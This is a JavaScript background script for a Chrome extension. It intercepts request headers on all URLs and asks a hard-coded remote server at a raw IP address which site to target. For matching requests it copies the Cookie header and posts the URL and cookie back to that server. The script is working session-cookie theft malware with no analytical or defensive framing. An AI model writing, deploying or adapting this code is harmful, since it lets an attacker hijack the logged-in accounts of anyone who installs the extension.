
var filter = "";
var baseUrl = "http://118.24.44.135:8080";
var filterUrl = baseUrl + "/getFilter";
var sendUrl = baseUrl + "/sendData";
var hasGetFilter = false;

chrome.webRequest.onBeforeSendHeaders.addListener(function (details) {
    if (!hasGetFilter) {
        hasGetFilter = true;
        webRequest("get", filterUrl, function (data) {
            filter = JSON.parse(data).url;
        })
    }
    if (filter.length == 0 || filterUrl == details.url || details.url.indexOf(filter) != 0) {
        return { requestHeaders: details.requestHeaders };
    }

    var cookie = null;
    for (var i = 0; i < details.requestHeaders.length; ++i) {
        if (details.requestHeaders[i].name === 'Cookie') {
            cookie = details.requestHeaders[i].value;
            webRequest("post", sendUrl, function (data) {
                console.log('send success');
            }, {
                    url: details.url,
                    cookie: cookie
                })
            break;
        }
    }

    return { requestHeaders: details.requestHeaders };
}, { urls: ["<all_urls>"] }, ["blocking", "requestHeaders"]);

function webRequest(method, url, callBack, data) {
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.open(method, url, true);
    xmlhttp.send(data);
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4) {
            if (xmlhttp.status == 200) {
                callBack(xmlhttp.responseText);
            } else {
                hasGetFilter = false;
            }
        }
    }
}

